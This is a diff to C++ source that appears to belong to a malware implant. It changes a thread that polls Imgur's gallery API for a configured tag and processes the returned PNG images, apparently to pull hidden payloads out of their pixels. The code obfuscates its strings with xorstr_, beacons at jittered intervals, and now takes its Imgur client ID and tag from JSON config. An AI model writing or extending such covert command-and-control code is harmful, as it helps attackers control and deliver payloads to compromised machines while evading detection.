@@ -24,13 +24,13 @@
 #include <time.h>
 #include <picopng.h>
 #include <tiny-json.h>
+#include "vr-config.h"
 #include "../shared/context.h"
 #include "../shared/payload.h"
 #include "../shared/winhttp.h"
 #include "../shared/coroutine.h"
 #include "../shared/debug.h"
 #include "../shared/math.h"
-#include "../config.h"
 
 bool png_has_enough_pixels(size_t pixel_bytes_count, unsigned need_bytes)
 {
@@ -75,11 +75,29 @@ bool imgur_process_png(context& ctx, const uint8_t* data, unsigned len)
     return false;
 }
 
-#pragma clang diagnostic push
-#pragma clang diagnostic ignored "-Wmissing-noreturn"
 void imgur_thread(context& ctx)
 {
-    stl::string client_id = vr_imgur_client_id;
+    stl::string client_id, imgur_tag;
+    int imgur_tag_query_time = 15;
+    int imgur_tag_query_time_jitter = 3;
+
+    if (const json_t* prop = json_getProperty(ctx.root, xorstr_("imgur_client_id")))
+        client_id = json_getValue(prop);
+
+    if (const json_t* prop = json_getProperty(ctx.root, xorstr_("imgur_tag")))
+        imgur_tag = json_getValue(prop);
+
+    if (const json_t* prop = json_getProperty(ctx.root, xorstr_("imgur_tag_query_time")))
+        imgur_tag_query_time = json_getInteger(prop);
+
+    if (const json_t* prop = json_getProperty(ctx.root, xorstr_("imgur_tag_query_time_jitter")))
+        imgur_tag_query_time_jitter = json_getInteger(prop);
+
+    if (client_id.size() == 0 || imgur_tag.size() == 0)
+    {
+        LOG_DEBUG("imgur is not configured.");
+        return;
+    }
 
     time_t http_last_timestamp = time(nullptr);
     stl::vector<json_t> pool(10000);
@@ -87,7 +105,7 @@ void imgur_thread(context& ctx)
     for (;;)
     {
         HttpRequest req{};
-        HttpResponse response = send_http_request(req, stl::string() + "https://api.imgur.com/3/gallery/t/" + vr_imgur_tag + "/time/week/0?client_id=" + client_id);
+        HttpResponse response = send_http_request(req, stl::string() + "https://api.imgur.com/3/gallery/t/" + imgur_tag + "/time/week/0?client_id=" + client_id);
         if (response.status == HttpOk)
         {
             stl::vector<char> response_data(response.content.c_str(), response.content.c_str() + response.content.size() + 1);
@@ -147,7 +165,6 @@ void imgur_thread(context& ctx)
             }
         }
 
-        yield(vr_imgur_tag_query_time + random(0, vr_imgur_tag_query_time_jitter));
+        yield((imgur_tag_query_time + random(0, imgur_tag_query_time_jitter)) * 60 * 1000);
     }
 }
-#pragma clang diagnostic pop
